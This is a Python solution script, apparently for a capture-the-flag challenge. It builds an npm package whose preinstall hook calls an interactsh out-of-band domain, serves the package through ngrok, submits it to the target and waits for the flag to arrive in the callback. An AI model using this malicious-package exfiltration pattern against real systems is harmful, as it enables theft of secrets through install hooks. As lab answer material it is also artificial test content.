import requests
import argparse
import yaml
from pathlib import Path
from time import time
import re
import json
import subprocess
import select
import logging
import secrets
import io
import html
import tarfile
from urllib.parse import unquote

logger = logging.getLogger('secretary')

OAST = re.compile(r'\[.*INF.*\] ([a-z0-9]+\.[a-z0-9]+\.[a-z]+)')

HERE = Path(__file__).parent
PAYLOAD = HERE / 'payload'
FLAG = yaml.safe_load(open(HERE / 'meta.yml'))['flags']

## IMPORTANT
## Before running the solution
## Start a http basic web server in the public directory
##   python -m http.server
## Start an ngrok-like server to make port 8000 available publically
##   ngrok http 8000
## The public URL of that server must be specified here

PAYLOAD_URL = 'https://044e-89-160-201-91.ngrok-free.app'


def test(url):
    session = requests.Session()

    user = secrets.token_hex(8)
    passw = secrets.token_hex()

    logger.debug('user: %s', user)
    logger.debug('pass: %s', passw)

    p = subprocess.Popen(['interactsh-client', '-json'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

    while True:
        line = p.stderr.readline()
        if m := OAST.match(line):
            domain = m.group(1)
            logger.debug('OAST domain: %s', domain)
            break

    with open(HERE / 'public' / 'package.tar', 'wb') as tf:
        with tarfile.open(mode='w:gz', fileobj=tf) as archive:
            archive.add(PAYLOAD / 'index.js', arcname='package/index.js')
            package = json.loads((PAYLOAD / 'package.json').read_text())
            package['scripts']['preinstall'] = package['scripts']['preinstall'].replace('OOB', f'http://{domain}')
            package_bin = json.dumps(package).encode()
            bytesio = io.BytesIO(package_bin)
            tarinfo = tarfile.TarInfo(name='package/package.json')
            tarinfo.size = len(package_bin)
            archive.addfile(tarinfo, fileobj=bytesio)

    session.post(url, data={'package': f'{PAYLOAD_URL}/package.tar'})

    start = time()
    request = None

    poll_obj = select.poll()
    poll_obj.register(p.stdout, select.POLLIN)
    while(time() - start < 180):
        poll_result = poll_obj.poll(0)
        if poll_result:
            line = p.stdout.readline()
            logger.debug(line)
            data = json.loads(line)
            if data['protocol'] != 'http':
                continue
            else:
                request = data['raw-request']
                break

    assert FLAG in request, request

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('url', default='http://localhost:5000', nargs='?')
    args = parser.parse_args()

    test(args.url)
